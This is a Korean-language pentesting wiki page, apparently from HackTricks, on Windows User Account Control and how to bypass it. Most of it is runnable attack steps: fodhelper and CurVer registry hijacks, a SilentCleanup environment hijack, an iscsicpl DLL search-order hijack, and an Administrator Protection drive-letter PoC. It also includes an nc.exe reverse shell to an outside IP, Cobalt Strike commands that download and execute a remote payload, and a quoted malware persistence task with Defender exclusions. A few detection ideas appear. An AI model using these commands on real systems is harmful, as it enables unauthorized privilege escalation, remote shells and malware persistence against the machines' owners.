# UAC - 사용자 계정 컨트롤

{{#include ../../banners/hacktricks-training.md}}

## UAC

[사용자 계정 컨트롤 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 작업에 대한 동의 프롬프트**를 활성화하는 기능입니다. 애플리케이션에는 서로 다른 `integrity` 수준이 있으며, **높은 수준**의 프로그램은 **시스템을 잠재적으로 손상시킬 수 있는 작업**을 수행할 수 있습니다. UAC가 활성화되면 관리자가 애플리케이션이나 작업이 시스템에 대한 관리자 수준 액세스 권한으로 실행되도록 명시적으로 승인하지 않는 한, 애플리케이션과 작업은 항상 **관리자가 아닌 계정의 보안 컨텍스트에서 실행됩니다**. 이는 관리자를 의도하지 않은 변경으로부터 보호하는 편의 기능이지만, security boundary로 간주되지는 않습니다.

integrity 수준에 대한 자세한 정보:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면 관리자 사용자에게는 2개의 token이 제공됩니다. 하나는 일반 작업을 medium integrity로 수행하기 위한 standard user token이고, 다른 하나는 관리자 권한이 포함된 token입니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)에서는 UAC의 작동 방식과 logon process, user experience, UAC architecture를 매우 자세히 설명합니다. 관리자는 security policies를 사용하여 로컬 수준에서 조직에 맞게 UAC 작동 방식을 구성하거나(secpol.msc 사용), Active Directory domain environment에서 Group Policy Objects (GPO)를 통해 구성하고 배포할 수 있습니다. 다양한 설정에 대한 자세한 내용은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 확인할 수 있습니다. UAC에 대해 설정할 수 있는 Group Policy 설정은 10개입니다. 다음 표에서 추가 세부 정보를 제공합니다.

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [사용자 계정 컨트롤: 기본 제공 Administrator 계정에 대한 Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (비활성화됨)                                             |
| [사용자 계정 컨트롤: Admin Approval Mode에서 관리자에 대한 elevation prompt 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop에서 Windows가 아닌 binary에 대해 동의 요청) |
| [사용자 계정 컨트롤: standard user에 대한 elevation prompt 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop에서 credential 요청)         |
| [사용자 계정 컨트롤: 애플리케이션 설치를 감지하고 elevation 요청](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (활성화됨; Enterprise에서는 기본적으로 비활성화됨)           |
| [사용자 계정 컨트롤: 서명되고 검증된 executable만 elevate](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (비활성화됨)                                             |
| [사용자 계정 컨트롤: secure location에 설치된 UIAccess application만 elevate](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (활성화됨)                                              |
| [사용자 계정 컨트롤: 모든 관리자를 Admin Approval Mode로 실행](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (활성화됨)                                              |
| [사용자 계정 컨트롤: secure desktop을 사용하지 않고 elevation을 요청하도록 UIAccess application 허용](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (비활성화됨)                                             |
| [사용자 계정 컨트롤: elevation 요청 시 secure desktop으로 전환](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (활성화됨)                                              |
| [사용자 계정 컨트롤: 파일 및 registry write failure를 사용자별 location으로 virtualize](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (활성화됨)                                              |

### Windows에서 software 설치를 위한 Policies

**local security policies**(대부분의 시스템에서 `"secpol.msc"`)는 기본적으로 **관리자가 아닌 사용자가 software를 설치하지 못하도록** 구성되어 있습니다. 즉, 관리자가 아닌 사용자가 software의 installer를 download할 수 있더라도, admin account 없이는 이를 실행할 수 없습니다.

### UAC가 Elevation을 요청하도록 강제하는 Registry Keys

admin rights가 없는 standard user로서, "standard" account가 특정 작업을 수행하려고 할 때 UAC에서 **credential을 요청하도록** 만들 수 있습니다. 이 작업을 수행하려면 특정 **registry keys**를 수정해야 하며, admin permissions가 필요합니다. 단, **UAC bypass**가 있거나 attacker가 이미 admin으로 log in한 경우는 예외입니다.

사용자가 **Administrators** group에 속해 있더라도, 이러한 변경 사항은 administrative action을 수행하기 위해 사용자가 **account credential을 다시 입력하도록** 강제합니다.

**실제로는 이미 elevated token, UAC bypass 또는 이러한 key를 변경할 수 있게 하는 misconfiguration이 있는 경우에만 유용합니다. 그렇지 않으면 registry write 자체가 차단됩니다.**

변경해야 하는 registry keys 및 entry는 다음과 같습니다(괄호 안은 기본값).

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Local Security Policy tool을 통해 수동으로 변경할 수도 있습니다. 변경하면 administrative operation을 수행할 때 사용자에게 credential을 다시 입력하라는 prompt가 표시됩니다.

### 참고

**User Account Control은 security boundary가 아닙니다.** 따라서 standard user는 local privilege escalation exploit 없이는 자신의 account에서 벗어나 administrator rights를 얻을 수 없습니다.

### 사용자에게 'full computer access' 요청하기
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC 권한

- Internet Explorer Protected Mode는 무결성 검사를 사용하여 높은 무결성 수준의 프로세스(웹 브라우저 등)가 낮은 무결성 수준의 데이터(임시 Internet 파일 폴더 등)에 접근하지 못하도록 합니다. 이는 브라우저를 낮은 무결성 token으로 실행하여 수행됩니다. 브라우저가 낮은 무결성 영역에 저장된 데이터에 접근하려고 하면 운영 체제는 프로세스의 무결성 수준을 확인하고 그에 따라 접근을 허용합니다. 이 기능은 remote code execution 공격이 시스템의 민감한 데이터에 접근하는 것을 방지하는 데 도움이 됩니다.
- 사용자가 Windows에 로그온하면 시스템은 사용자의 권한 목록이 포함된 access token을 생성합니다. 권한은 사용자의 권리와 기능의 조합으로 정의됩니다. token에는 사용자의 credentials 목록도 포함되며, 이는 사용자를 컴퓨터 및 네트워크의 리소스에 authenticate하는 데 사용되는 credentials입니다.

### Autoadminlogon

시작 시 특정 사용자로 Windows에 자동으로 로그온하도록 구성하려면 **`AutoAdminLogon` registry key**를 설정합니다. 이는 kiosk 환경이나 테스트 목적으로 유용합니다. registry에 password가 노출되므로 secure system에서만 사용하십시오.

Registry Editor 또는 `reg add`를 사용하여 다음 key를 설정합니다:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

일반 로그온 동작으로 되돌리려면 `AutoAdminLogon`을 0으로 설정합니다.

## UAC bypass

> [!TIP]
> victim에 대한 graphical access가 있다면 UAC prompt가 나타날 때 간단히 "Yes"를 클릭할 수 있으므로 UAC bypass는 straightforward합니다.

다음 상황에서는 UAC bypass가 필요합니다: **UAC가 활성화되어 있고, process가 medium integrity context에서 실행 중이며, 사용자가 administrators group에 속해 있는 경우**.

UAC가 가장 높은 security level(Always)로 설정된 경우 다른 level(Default) 중 하나로 설정된 경우보다 **bypass하기가 훨씬 더 어렵다**는 점을 언급할 필요가 있습니다.

### medium-integrity shell에서 빠르게 triage 수행

bypass를 시도하기 전에 올바른 상황인지 확인하고 host build를 알려진 작동 방식에 매핑합니다:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
실무 참고 사항:
- `EnableLUA=0`이면 bypass가 필요하지 않습니다. 모든 admin token이 직접 high integrity를 요청할 수 있습니다.
- `ConsentPromptBehaviorAdmin=2` 또는 `5`는 auto-elevate / COM-based bypasses에서 일반적인 시나리오입니다.
- `Always Notify`는 기준을 높이지만, 실패한다고 가정하지 말고 정확한 빌드에서 테스트해야 합니다. UACME는 최신 Windows 빌드에서도 일부 `AlwaysNotify compatible` methods를 여전히 추적합니다.

### UAC 비활성화

UAC가 이미 비활성화되어 있다면 (`ConsentPromptBehaviorAdmin`이 **`0`**) 다음과 같은 방법으로 **관리자 권한으로 reverse shell을 실행**할 수 있습니다 (높은 무결성 수준):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

Administrators 그룹에 속한 user의 shell이 있다면 **C$** shared를 SMB를 통해 로컬에서 새 disk로 **mount**할 수 있으며, 그러면 **file system 내부의 모든 항목에 access**할 수 있습니다(Administrator home folder도 포함).

> [!WARNING]
> **Looks like this trick isn't working anymore**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike를 이용한 UAC bypass

Cobalt Strike techniques는 UAC가 최고 보안 수준으로 설정되어 있지 않은 경우에만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 및 **Metasploit**에도 **UAC**를 **bypass**하기 위한 여러 모듈이 있습니다.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects는 최신 빌드에서도 여전히 실용적인 UAC 공격 표면으로 남아 있습니다. `ICMLuaUtil`은 현재 Windows 브랜치에서도 작동하는 것으로 UACME에서 계속 추적되고 있으며, offensive tooling은 interactive desktop process, 64-bit execution, 때로는 PEB/process masquerading을 결합한 뒤 COM Elevation Moniker를 호출하는 방식으로 `CMSTPLUA`에 계속 적응하고 있습니다.

Practical tips:
- 사용자의 **interactive session**에서 실행되는 **64-bit** process를 우선 사용하세요(일반적으로 `explorer.exe` 또는 그 자식 process).
- raw shell이 실패하면 단순한 `CreateProcess` wrapper 대신 BOF / UACME implementation에서 다시 시도하세요.
- child execution은 **별도의 elevated process**에서 발생할 수 있습니다. 많은 BOF는 현재 beacon을 in-place로 elevate하지 않습니다.

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)의 documentation 및 tool

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)는 여러 UAC bypass exploits를 **compilation**한 것입니다. UACME를 **visual studio 또는 msbuild를 사용하여 compile**해야 한다는 점에 유의하세요. compilation을 수행하면 여러 executable이 생성됩니다(예: `Source\Akagi\outout\x64\Debug\Akagi.exe`). 필요한 **것이 어느 것인지 알아야 합니다.**\
일부 bypass는 **다른 프로그램을 prompt하여** 무언가 발생하고 있음을 **user에게 alert**할 수 있으므로 **주의해야 합니다.**

UACME에는 각 technique이 작동하기 시작한 **build version**이 표시되어 있습니다. 자신의 version에 영향을 미치는 technique을 검색할 수 있습니다:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
또한 [이](https://en.wikipedia.org/wiki/Windows_10_version_history) 페이지를 사용하면 build 버전에서 Windows release `1607`을 확인할 수 있습니다.

실용적인 workflow는 먼저 **호스트 build를 평가**한 다음, 일치하는 method만 실행하는 것입니다:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`는 로컬 빌드를 알려진 UAC 방법과 빠르게 비교하므로, 작동하지 않는 PoC를 신속하게 제외하는 데 유용합니다.
- `UACME`는 여전히 우회 방법을 정확한 빌드에 매핑할 수 있는 최고의 공개 catalogue입니다. 최근 릴리스에는 새로운 방법이 추가되었고 기존 방법이 **Windows 11 25H2**에서 다시 테스트되었으므로, 오래된 블로그 게시물이 여전히 변경 없이 적용된다고 가정하기 전에 README/release notes를 다시 확인하세요.

### UAC Bypass – fodhelper.exe (Registry hijack)

신뢰된 바이너리 `fodhelper.exe`는 최신 Windows에서 자동으로 권한 상승됩니다. 실행되면 `DelegateExecute` verb를 검증하지 않고 아래의 per-user registry path를 조회합니다. 해당 위치에 명령을 심으면 Medium Integrity 프로세스(사용자가 Administrators 그룹에 속한 경우)가 UAC prompt 없이 High Integrity 프로세스를 생성할 수 있습니다.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 단계 (payload를 설정한 다음 trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
참고:
- 현재 사용자가 Administrators의 멤버이고 UAC level이 default/lenient인 경우 작동합니다(추가 제한이 적용되는 Always Notify가 아님).
- 64-bit Windows에서 32-bit process로부터 64-bit PowerShell을 시작하려면 `sysnative` path를 사용합니다.
- Payload는 모든 command(PowerShell, cmd 또는 EXE path)가 될 수 있습니다. stealth를 위해 prompting UI는 피하세요.

#### CurVer/extension hijack variant (HKCU only)

최근 `fodhelper.exe`를 악용하는 samples는 `DelegateExecute`를 피하고, 대신 per-user `CurVer` value를 통해 **`ms-settings` ProgID**를 **redirect**합니다. auto-elevated binary는 여전히 `HKCU`에서 handler를 resolve하므로, keys를 심는 데 admin token이 필요하지 않습니다:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
권한이 상승되면 malware는 일반적으로 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`을 `0`으로 설정하여 **향후 프롬프트를 비활성화**한 다음, 추가적인 defense evasion(예: `Add-MpPreference -ExclusionPath C:\ProgramData`)을 수행하고 high integrity로 실행되도록 persistence를 다시 생성합니다. 일반적인 persistence task는 디스크에 **XOR-encrypted PowerShell script**를 저장하고, 매시간 이를 디코딩하여 메모리에서 실행합니다:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
이 변형은 여전히 dropper를 정리하고 staged payloads만 남기므로, 탐지는 **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` 변조, Defender exclusion 생성 또는 메모리에서 PowerShell을 decrypt하는 scheduled tasks 모니터링에 의존하게 됩니다.

### `SilentCleanup` task를 통한 UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`은 `cleanmgr.exe`를 highest privileges로 실행하고 사용자 환경에서 `%windir%`를 확장합니다. `HKCU\Environment\windir`를 제어할 수 있다면 해당 확장을 arbitrary command로 redirect하여 consent dialog 없이 high integrity를 얻을 수 있습니다. UACME가 이 technique을 계속 활성 상태로 유지하고 있으며, 최근 issue tracking에 따르면 Windows 11 24H2에서는 quoting을 약간 조정하는 것만 필요할 수 있으므로, 최근 builds에서도 이 method를 여전히 테스트할 가치가 있습니다.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
해당 build에서 경로를 따옴표로 감싸는 경우 payload가 따옴표로 끝나도록 하여 다시 시도하세요(예: `cmd.exe"`). 테스트 후에는 항상 `HKCU\Environment\windir`를 정리하세요.

#### More UAC bypass

UI 흐름, COM objects 또는 desktop interaction을 악용하는 많은 classic UAC bypass는 victim의 **full interactive session**이 필요합니다. 일반적인 `nc.exe` shell이나 **Session 0**에서 실행 중인 service만으로는 충분하지 않은 경우가 많습니다.

이를 **meterpreter** session으로 해결할 수 있는 경우가 많습니다. **Session** 값이 **1**인 **process**로 Migrate하세요:

![ms-settings를 custom extension (.thm)으로 지정하고 해당 extension을 payload에 매핑 - More UAC bypass: meterpreter session을 사용하여 얻을 수 있습니다. Session이...인 process로 Migrate하세요...](<../../images/image (863).png>)

(_explorer.exe_가 작동해야 합니다)

### GUI를 사용한 UAC Bypass

**GUI에 access할 수 있다면 UAC prompt가 나타날 때 그냥 accept하면 됩니다**. 실제로 technical bypass가 필요한 것은 아닙니다. 따라서 GUI session을 확보하는 것만으로도 UAC가 추가하는 실질적인 불편을 우회할 수 있는 경우가 많습니다.

또한 누군가 사용 중이던 GUI session(예를 들어 RDP를 통한 session)을 확보했다면, **administrator로 실행 중인 tools가 있을 수 있습니다**. 이러한 tool에서 **cmd** 등을 다시 UAC prompt 없이 **as admin**으로 직접 **run**할 수 있습니다. 예를 들어 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)가 있습니다. 이는 조금 더 **stealthy**할 수 있습니다.

### 시끄러운 brute-force UAC bypass

탐지되는 것을 신경 쓰지 않는다면 [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)와 같은 것을 **run**할 수 있습니다. 이 tool은 **user가 accept할 때까지 permissions elevation을 요청합니다**.

### 자체 bypass - Basic UAC bypass methodology

**UACME**를 살펴보면 **많은 UAC bypass가 DLL hijacking을 악용한다는 것**을 알 수 있습니다(대개 elevated binary가 writable path에서 attacker-controlled DLL을 load하도록 만듭니다). [DLL hijacking vulnerability를 찾는 방법은 여기에서 확인하세요](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate**되는 binary를 찾습니다(실행 시 high integrity level로 실행되는지 확인).
2. procmon으로 **DLL Hijacking**에 취약할 수 있는 "**NAME NOT FOUND**" events를 찾습니다.
3. 보호된 일부 **protected paths**(예: C:\Windows\System32)에 DLL을 **write**해야 할 가능성이 높지만, 해당 경로에는 writing permissions가 없습니다. 다음 방법으로 이를 우회할 수 있습니다:
1. **wusa.exe**: Windows 7,8 및 8.1. 이 tool은 high integrity level에서 실행되므로 CAB file의 content를 protected paths 내부에 extract할 수 있습니다.
2. **IFileOperation**: Windows 10.
4. DLL을 protected path 내부에 copy하고 취약한 autoelevated binary를 execute하는 **script**를 준비합니다.

### Another UAC bypass technique

**autoElevated binary**가 **execute**할 **binary** 또는 **command**의 **name/path**를 **registry**에서 **read**하려 하는지 확인하는 방식입니다(해당 binary가 이 정보를 **HKCU** 내부에서 검색한다면 더욱 유용합니다).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack을 통한 UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`는 search order를 통해 `iscsiexe.dll`을 load하도록 악용할 수 있는 **auto-elevated** binary입니다. **user-writable** folder에 malicious `iscsiexe.dll`을 배치한 다음 현재 user의 `PATH`를 수정하여(예: `HKCU\Environment\Path`) 해당 folder가 검색되도록 하면, Windows가 **UAC prompt를 표시하지 않고** elevated `iscsicpl.exe` process 내부에 attacker DLL을 load할 수 있습니다.

실용적인 참고 사항:
- 이는 현재 user가 **Administrators**에 속해 있지만 UAC로 인해 **Medium Integrity**에서 실행 중일 때 유용합니다.
- 이 bypass에서 중요한 것은 **SysWOW64** copy입니다. **System32** copy는 별도의 binary로 취급하고 동작을 독립적으로 검증하세요.
- 이 primitive는 **auto-elevation**과 **DLL search-order hijacking**의 조합이므로, 다른 UAC bypass에 사용하는 것과 동일한 ProcMon workflow가 누락된 DLL load를 검증하는 데 유용합니다.

최소 flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
탐지 아이디어:
- `reg add` / `HKCU\Environment\Path`에 대한 레지스트리 쓰기 직후 `C:\Windows\SysWOW64\iscsicpl.exe`가 실행되는 경우 알림을 생성합니다.
- `%TEMP%` 또는 `%LOCALAPPDATA%\Microsoft\WindowsApps`와 같은 **사용자 제어** 위치에서 `iscsiexe.dll`을 검색합니다.
- `iscsicpl.exe` 실행을 일반적인 Windows 디렉터리 외부에서 로드되는 예기치 않은 자식 프로세스 또는 DLL과 연관 분석합니다.

### 별도로 확인할 가치가 있는 최신 연구

일부 2024년 이후 chain은 더 이상 기존의 `HKCU\Software\Classes` 레지스트리 hijack처럼 보이지 않습니다. 예를 들어 activation-context cache poisoning은 **drive remap** 및 **DLL redirection**을 chain하여 `ctfmon.exe`와 이후 대상인 `fodhelper.exe` 같은 trusted UI / auto-elevated binary를 통해 medium integrity에서 high integrity로 이동할 수 있습니다. 여기에 대규모 PoC를 중복해서 포함하는 대신 다음의 간결한 payload 예제를 확인하세요:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) per-logon-session DOS device map을 통한 drive-letter hijack

Windows 11 25H2의 전체 `RAiLaunchAdminProcess` / UIAccess attack surface는 전용 페이지를 확인하세요:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2의 “Administrator Protection”은 per-session `\Sessions\0\DosDevices/<LUID>` map을 사용하는 shadow-admin token을 활용합니다. 이 디렉터리는 처음 `\??` resolution이 수행될 때 `SeGetTokenDeviceMap`에 의해 지연 생성됩니다. 공격자가 shadow-admin token을 **SecurityIdentification** 수준에서만 impersonate하면, 디렉터리는 공격자를 **owner**로 하여 생성되고(`CREATOR OWNER` 상속), 이를 통해 `\GLOBAL??`보다 우선하는 drive-letter link를 생성할 수 있습니다.

**단계:**

1. low-privileged session에서 `RAiProcessRunOnce`를 호출하여 promptless shadow-admin `runonce.exe`를 spawn합니다.
2. 기본 token을 **identification** token으로 duplicate하고, `\??`를 여는 동안 이를 impersonate하여 공격자 소유의 `\Sessions\0\DosDevices/<LUID>` 생성을 강제합니다.
3. 해당 위치에 공격자가 제어하는 storage를 가리키는 `C:` symlink를 생성합니다. 이후 해당 session의 filesystem access는 `C:`를 공격자 path로 resolve하므로 prompt 없이 DLL/file hijack을 수행할 수 있습니다.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 참고 자료
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – User Account Control 작동 방식](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 동남아시아 정부 대상 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection 우회](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – UI Access 악용을 통한 Administrator Protection 우회](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – SilentCleanup Task를 사용한 Bypass UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
